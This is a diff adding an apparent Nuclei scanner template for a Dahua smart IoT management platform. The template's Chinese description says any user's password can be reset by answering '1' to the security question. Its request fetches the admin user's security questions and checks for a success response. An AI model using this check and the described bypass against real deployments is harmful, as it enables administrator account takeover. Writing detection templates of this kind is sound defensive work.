@@ -1,0 +1,32 @@
+id: dahua-icc-restpasswd
+info:
+  name: 大华智能物联综合管理平台存在任意重置用户密码漏洞
+  author: apple
+  severity: high
+  description: 重置密码的地址为/config/index.html#/login。通过忘记密码处输入密保为 1 绕过修改密码。
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        GET /evo-runs/v1.0/auths/sysusers/v2/security/questions/admin?_t=1715070250415 HTTP/2
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
+        Accept: application/json, text/plain, */*
+        Accept-Language: zh-CN
+        Accept-Encoding: gzip, deflate, br
+        Strict-Transport-Security: max-age=31536000; includeSubDomains
+        Timeoffset: -28800000
+        Content-Type: application/json;charset=utf-8
+        Referer: https://{{Hostname}}/config/index.html
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: cors
+        Sec-Fetch-Site: same-origin
+        Te: trailers
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"success":true'
